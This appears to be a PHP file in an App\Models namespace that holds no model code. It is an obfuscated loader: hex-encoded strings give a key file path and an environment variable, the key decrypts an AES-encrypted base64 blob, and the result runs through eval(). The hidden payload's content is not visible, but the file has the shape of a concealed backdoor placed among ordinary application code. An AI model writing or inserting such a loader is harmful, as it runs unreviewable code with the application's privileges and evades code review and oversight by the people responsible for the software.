<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('l4vfkYNoPU7a2gJGW3MCFA==');

$c=base64_decode(

'mQqx2GKTzufuhoWhZ1uXlWTuF2KIs+sOXzgkf3kzTL7Udeb01+dXeTwCLEuLCFMlL+WRpHhyvzU4' .
'Ye5fyRg6ap6wvDKt6juyi0P0UOxRWh7aQqV01+AfRlyOtIM5qSt8Tbarp5jPTkHOdVHHiWl/U+3Y' .
'WRhvvZ6FxIzqVESoTfObTqvRD4WPmWeU11ntrv3VXr+fYLCbe5plVpRpxTHTTbzCLqA20/QOj5Qg' .
'tSTHfIA18Mai8zZL0bdvKS3+TYmcvHnuEq4Ivacx0tdsuB8mUrj+gXarI/cO4NJIWs2JyJfJPjGs' .
'wotWicnsT5EFO6FFqjcVNMVYXFUBrMvH5dQp1fMUkBdrCiGhURDOUtJYAYQhxAUBzCB28115PvbH' .
'wsnOIdD/6cSWk5PCjK2+FOz3CTVYGlenef5YS9iJmbKm7yvLO2hbazbeRqhWoym/8aeTN196mhgA' .
'D2RhHIBUJ+S8+GmN8rWKDLRf9bZyKniDpLBCedHg4Hw4aX7Ty6FAgiE/BXCNSwfLeCC2U57wg7yn' .
'jhgL4mQmYHZ8S1d0HuIMKRl4o3JDVea5U29wT2p8eEDUxHjcNb2eo3KNp0JcqLYpP+Q49El+z8P7' .
'Nk8Ns0UEM9uOX7rkzqh80SEbxVsam5h1oxuxTtHVT5epeNe+c9b49sYIsy/A8kI6+kPWcp0Rkyag' .
'18aOBaF7k4h99muWirXT2CkZfxWtm6D0XLMAr5QGaG+8GkXw77BECGdo/+iJrbGhBmcfb7zkRVMg' .
'ciKmW6hyDH5kg5tHyhz37uMmTZ5HTg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

